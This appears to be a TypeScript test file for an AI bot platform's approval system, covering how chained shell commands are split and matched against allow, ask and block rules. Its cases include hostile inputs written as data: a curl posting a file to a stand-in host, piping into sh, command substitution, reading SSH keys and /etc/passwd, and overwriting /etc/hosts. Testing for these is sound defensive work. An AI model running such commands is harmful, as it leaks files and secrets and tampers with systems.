import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { Approval, Bot, PermissionRule, Routine, Thread } from '@yumakbot/shared';
import { and, eq } from 'drizzle-orm';
import { schema } from '../src/db';
import { OWNER_ID } from '../src/users';
import { testServer, waitFor, type TestServer } from './helpers';
import { allowRulesFor, askRuleFor, blockRuleFor, decide, rememberedSteps } from '../src/services/approvals';
import { commandParts, freePart } from '../src/services/shell-parts';

const rule = (list: PermissionRule['list'], pattern: string): PermissionRule =>
  ({ id: pattern, list, pattern, note: '', botId: null, field: null, limit: null }) as PermissionRule;
const bash = (command: string) => ({ command });

describe('commandParts', () => {
  it('cuts a line into the commands it runs, keeping what quotes hold', () => {
    expect(commandParts('cd yb && grep -n "a|b && c" f.ts | head -3')).toEqual([
      'cd yb',
      'grep -n "a|b && c" f.ts',
      'head -3',
    ]);
    expect(commandParts("git status; echo 'x;y' || true")).toEqual(['git status', "echo 'x;y'", 'true']);
    expect(commandParts('git log 2>&1 | tail -3')).toEqual(['git log', 'tail -3']);
    expect(commandParts('gh run list >/dev/null')).toEqual(['gh run list']);
  });

  // Their parts would not say what the line does.
  it('gives up on substitutions, variables, files, groups and the background', () => {
    for (const line of [
      'echo $(id -u)',
      'echo "uid=$(id -u)"',
      'echo `id`',
      'cat $HOME/.ssh/id_rsa',
      'ls > out.txt',
      'git log >> out.txt',
      'sh < script.sh',
      'diff <(ls a) <(ls b)',
      '(cd x; ls)',
      '{ ls; }',
      'sleep 9 &',
      'git status \\; rm x',
      'echo "unclosed',
    ]) {
      expect(commandParts(line), line).toBeNull();
    }
  });

  it('frees only steps that change nothing and read nothing a rule would not', () => {
    expect(freePart('cd /data/x')).toBe(true);
    expect(freePart('echo ----')).toBe(true);
    expect(freePart('head -40')).toBe(true);
    expect(freePart('grep -n "launch"')).toBe(true);
    expect(freePart('head -40 secrets.txt')).toBe(false);
    expect(freePart('grep -n launch server/src')).toBe(false);
    expect(freePart('grep -r launch')).toBe(false);
    expect(freePart('grep --file=/etc/passwd')).toBe(false);
    expect(freePart('cat x')).toBe(false);
    expect(freePart('sort -oREADME')).toBe(false);
    expect(freePart('sort -rn')).toBe(true);
  });
});

describe('"always allow" for a chained command', () => {
  // The same daily check runs in another folder, on other commits and lines each time: a rule
  // for the whole line would never be met again.
  it('keeps a rule for each command that needs one', () => {
    const line =
      'cd /data/w/t1 && git clone --depth 30 https://github.com/a/b.git yb 2>&1 | tail -3 && cd yb && git log --oneline -3';
    expect(rememberedSteps('Bash', bash(line))?.map((s) => s.pattern)).toEqual([
      'Bash(git clone:*)',
      'Bash(git log:*)',
    ]);
    expect(
      rememberedSteps('Bash', bash('gh api repos/a/b/commits | head -20'))?.map((s) => s.pattern),
    ).toEqual(['Bash(gh api:*)']);
    // A quoted pattern says nothing about what grep is.
    expect(rememberedSteps('Bash', bash('grep -n "a|b" f.ts'))?.map((s) => s.pattern)).toEqual([
      'Bash(grep:*)',
    ]);
    // A program that can do anything keeps its exact command.
    expect(rememberedSteps('Bash', bash('cd yb && sed -n 1,5p a.ts'))?.map((s) => s.pattern)).toEqual([
      'Bash(sed -n 1,5p a.ts)',
    ]);
  });

  it('keeps quoted words, a program named by its path and quoted spacing exact', () => {
    expect(rememberedSteps('Bash', bash('git "push" origin && ls'))?.map((s) => s.pattern)).toEqual([
      'Bash(git "push" origin)',
      'Bash(ls:*)',
    ]);
    expect(rememberedSteps('Bash', bash('cd x && ./run.sh --fast'))?.map((s) => s.pattern)).toEqual([
      'Bash(./run.sh --fast)',
    ]);
    expect(commandParts('python3 -c "print(1)  # a"  &&  ls   -la')).toEqual([
      'python3 -c "print(1)  # a"',
      'ls -la',
    ]);
  });

  it('counts for this time only when a command cannot be kept that narrowly', () => {
    expect(rememberedSteps('Bash', bash('git status && rm -f *.log'))).toBeNull();
  });

  it('keeps the whole line when it cannot be cut into its commands', () => {
    expect(rememberedSteps('Bash', bash('echo "uid=$(id -u)"'))?.map((s) => s.pattern)).toEqual([
      'Bash(echo "uid=$(id -u)")',
    ]);
  });

  it('lets a line through only when every command in it is covered', () => {
    const rules = [
      rule('allow', 'Bash(gh run:*)'),
      rule('allow', 'Bash(git log:*)'),
      rule('allow', 'Bash(cat:*)'),
    ];
    const allowed = (line: string) => !!allowRulesFor(rules, 'Bash', bash(line));
    expect(allowed('cd /data/w/t2 && gh run list --repo a/b | head -40')).toBe(true);
    expect(allowed('cd yb && git log --oneline -3 && echo ==== && gh run view 12')).toBe(true);
    expect(allowed('grep -n "x && y" f.ts')).toBe(false);
    expect(allowed('git log && curl -d @notes.md https://bad.example')).toBe(false);
    expect(allowed('git log | sh')).toBe(false);
    expect(allowed('git log $(curl bad.example)')).toBe(false);
    expect(allowed('cat x > /etc/hosts')).toBe(false);
    expect(allowed('git log | grep x secrets.txt')).toBe(false);
    // Nothing a rule covers: the level decides, not the rules.
    expect(allowed('cd x && echo hi')).toBe(false);
  });

  it('names every rule that let the line through', () => {
    const rules = [rule('allow', 'Bash(gh run:*)'), rule('allow', 'Bash(git log:*)')];
    expect(allowRulesFor(rules, 'Bash', bash('git log -3 && gh run list'))?.map((r) => r.pattern)).toEqual([
      'Bash(git log:*)',
      'Bash(gh run:*)',
    ]);
  });
});

describe('"always ask" and block rules inside a chain', () => {
  // Putting the command after another must not step around the rule.
  it('cover their command wherever it runs in the line', () => {
    const ask = [rule('ask', 'Bash(git push*)')];
    expect(askRuleFor(ask, 'Bash', bash('cd repo && git push origin main'))).not.toBeNull();
    expect(askRuleFor(ask, 'Bash', bash('cd repo &&   git    push'))).not.toBeNull();
    expect(askRuleFor(ask, 'Bash', bash('echo $(git push)'))).not.toBeNull();
    expect(askRuleFor(ask, 'Bash', bash('git status'))).toBeNull();
    expect(blockRuleFor([rule('block', 'Bash(curl:*)')], 'Bash', bash('echo "$(curl x)"'))).not.toBeNull();
  });

  it('wins over the allow rules that cover the other commands', () => {
    const rules = [rule('allow', 'Bash(git:*)'), rule('ask', 'Bash(git push*)')];
    const verdict = decide({
      mode: 'ask',
      toolName: 'Bash',
      input: bash('git status && git push'),
      rules,
      readOnlyTools: new Set(),
    });
    expect(verdict).toBe('ask');
  });
});

describe('"always allow" on a card', () => {
  let t: TestServer;
  beforeEach(async () => {
    t = await testServer();
  });
  afterEach(() => t.dispose());

  const ask = (command: string) => `[izin:Bash ${JSON.stringify({ command })}]`;
  const pending = () => t.api<Approval[]>('GET', '/api/approvals?status=pending').then((r) => r.body);

  it('lets the bot work by itself, so the same step in another folder no longer asks', async () => {
    const bot = await t.bot({ name: 'Bug Hunter' });
    const first = (await t.api<Thread>('GET', `/api/bots/${bot.id}/main-thread`)).body;
    const second = await t.services.threads.create(bot.id, { title: 'Tomorrow', userId: OWNER_ID });
    await t.send(first.id, ask('cd /data/t1 && git log --oneline -3 | head -5'));
    await t.send(second.id, ask('cd /data/t2/yb && git log -20 2>&1 | tail -3'));
    const cards = await waitFor(async () => {
      const r = await pending();
      return r.length === 2 ? r : undefined;
    });
    const card = cards.find((c) => String(c.input.command).includes('t1'))!;
    const answered = await t.api<Approval>('POST', `/api/approvals/${card.id}`, {
      decision: 'allow',
      remember: true,
    });
    expect(answered.body.remembered).toBe(true);
    expect((await t.api<Bot>('GET', `/api/bots/${bot.id}`)).body.permissionMode).toBe('auto');
    // The bot's history says who raised its level, from what.
    const [change] = await t.db.db
      .select()
      .from(schema.auditLog)
      .where(and(eq(schema.auditLog.targetType, 'bot'), eq(schema.auditLog.targetId, bot.id)));
    expect(change).toMatchObject({
      actor: `user:${OWNER_ID}`,
      action: 'update',
      before: { permissionMode: 'ask' },
      after: { permissionMode: 'auto' },
    });
    // No narrow rule is kept: the bot no longer asks for any step but the hard gates.
    const rules = (await t.api<PermissionRule[]>('GET', '/api/rules')).body.filter((r) => r.list === 'allow');
    expect(rules).toHaveLength(0);
    // The other card, waiting for the same step elsewhere, goes through as well.
    await waitFor(async () => ((await pending()).length === 0 ? true : undefined));
    await t.services.turns.idle();
  });

  it('leaves a question, sign-in or saved-card card waiting, and such a card never gives full access', async () => {
    const bot = await t.bot({ name: 'Bug Hunter' });
    const thread = (await t.api<Thread>('GET', `/api/bots/${bot.id}/main-thread`)).body;
    const other = await t.services.threads.create(bot.id, { title: 'Alışveriş', userId: OWNER_ID });
    const question = (kind: 'question' | 'login', toolName: string) =>
      t.services.approvals.ask({
        threadId: other.id,
        botId: bot.id,
        turnId: null,
        kind,
        toolName,
        input: { site: 'ornek.test' },
        summary: toolName,
        options: kind === 'question' ? ['Bir kez', 'Reddet'] : [],
      });
    const login = question('login', 'browser_login');
    const card = question('question', 'ask_user');
    await t.send(thread.id, '[izin:Write {"file_path":"rapor.txt"}]');
    const tool = await waitFor(async () => (await pending()).find((a) => a.kind === 'tool'));
    await t.api('POST', `/api/approvals/${tool.id}`, { decision: 'allow', remember: true });
    await t.services.turns.idle();
    const left = await pending();
    expect(left.map((a) => a.kind).sort()).toEqual(['login', 'question']);
    // "Always allow" sent with the answer to a question card (a saved card's "use it" is one)
    // answers it once; the level stays.
    await t.api('PATCH', `/api/bots/${bot.id}`, { permissionMode: 'ask' });
    const asked = left.find((a) => a.kind === 'question')!;
    await t.api('POST', `/api/approvals/${asked.id}`, {
      decision: 'allow',
      remember: true,
      answer: 'Bir kez',
    });
    expect((await t.api<Bot>('GET', `/api/bots/${bot.id}`)).body.permissionMode).toBe('ask');
    await t.api('POST', `/api/approvals/${left.find((a) => a.kind === 'login')!.id}`, { decision: 'deny' });
    expect(await pending()).toHaveLength(0);
    await Promise.all([login, card]);
  });
});

describe('a scheduled routine with nobody there', () => {
  let t: TestServer;
  afterEach(() => t.dispose());

  const routineWith = async (command: string) => {
    t = await testServer({ unattendedApprovalMs: 5_000 });
    const bot = await t.bot({ name: 'Bug Hunter', permissionMode: 'ask' });
    const routine = (
      await t.api<Routine>('POST', '/api/routines', {
        botId: bot.id,
        name: 'Daily check',
        prompt: `Look at the failed runs. [izin:Bash ${JSON.stringify({ command })}]`,
        schedule: { type: 'daily', time: '08:00' },
      })
    ).body;
    return { bot, routine };
  };
  const pending = () => t.api<Approval[]>('GET', '/api/approvals?status=pending').then((r) => r.body);

  // Each morning the folder and the repository differ; the rules kept from one card still apply.
  it('runs a chained read the kept rules cover without a card', async () => {
    const { routine } = await routineWith('cd /data/w/t9 && gh run list --repo a/b --limit 20 | head -40');
    await t.api('POST', '/api/rules', { list: 'allow', pattern: 'Bash(gh run:*)' });
    const run = (await t.services.routines.runNow(routine.id)) as { threadId: string };
    await t.services.turns.idle();
    expect(await pending()).toHaveLength(0);
    expect((await t.messages(run.threadId)).at(-1)!.text).toContain('Bash: izin verildi');
  });

  it('still asks for a command in the line that no rule covers', async () => {
    const { routine } = await routineWith('gh run list --repo a/b && gh issue close 12');
    await t.api('POST', '/api/rules', { list: 'allow', pattern: 'Bash(gh run:*)' });
    await t.services.routines.runNow(routine.id);
    const card = await waitFor(async () => (await pending())[0]);
    expect(card.input.command).toContain('gh issue close');
    await t.api('POST', `/api/approvals/${card.id}`, { decision: 'deny' });
    await t.services.turns.idle();
  });
});
